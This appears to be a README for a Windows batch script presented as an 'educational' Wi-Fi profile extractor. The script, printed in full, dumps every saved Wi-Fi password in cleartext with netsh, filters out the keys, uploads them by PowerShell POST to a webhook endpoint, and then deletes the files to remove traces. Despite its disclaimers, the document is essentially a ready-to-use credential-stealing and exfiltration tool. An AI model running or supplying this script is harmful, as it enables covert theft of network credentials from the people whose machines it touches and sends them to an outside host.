# 🔐 Wi-Fi Profile Extractor | ⚠️ For Educational Use Only

A sleek little batch script to extract saved Wi-Fi profiles (with passwords) on Windows machines.  
Built using native Windows tools (`netsh`, PowerShell) for quick & dirty demonstrations of how *your system already knows your Wi-Fi passwords* — and so can anyone with access. 👀

> ⚠️ **Disclaimer:** This project is for **educational** and **authorized** use only.  
> ❌ **Do NOT use this script on systems you don’t own or don’t have explicit permission to test.**  
> ☠️ Unauthorized use may be illegal under local and international laws (CFAA, GDPR, etc.).

---

## 🚀 What This Script Does

1. 🔍 Dumps all saved Wi-Fi profiles and their keys in cleartext using `netsh`.
2. 🧠 Parses the XMLs to extract just the passwords (`keyMaterial`).
3. ☁️ Uploads the extracted data to your custom webhook (e.g. `Webhook.site`).
4. 🧹 Cleans up all traces (XML files + password dump).

---
## 📦 About This Project

This script is a proof-of-concept to demonstrate how saved Wi-Fi passwords on a Windows machine can be extracted using built-in tools and sent to a remote server — purely for **educational**, **testing**, or **internal audit** purposes.

In this example, the extracted Wi-Fi data is sent to a test endpoint powered by [Webhook.site](https://webhook.site/).  
You can use [this specific view link](https://webhook.site/#!/view/13177c83-0f7f-429f-8134-a54909bef73a) as a reference for how data is received.

> 🛑 **Do NOT use this tool for malicious purposes.** This repo and its contents are for learning, lab setups, and awareness of Windows' saved credential handling only.

### 🧪 Example Usage:

When the script runs, it performs the following:

- Extracts all saved Wi-Fi profiles and plaintext keys using:

## 📁 Script Breakdown

```bat
@echo off
netsh wlan export profile key=clear
timeout /t 2
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
timeout /t 2
powershell Invoke-WebRequest -Uri "https://your-webhook-url" -Method POST -InFile WiFi-Key
timeout /t 2
del Wi* /s/f/q

##Author : Yashi Singh
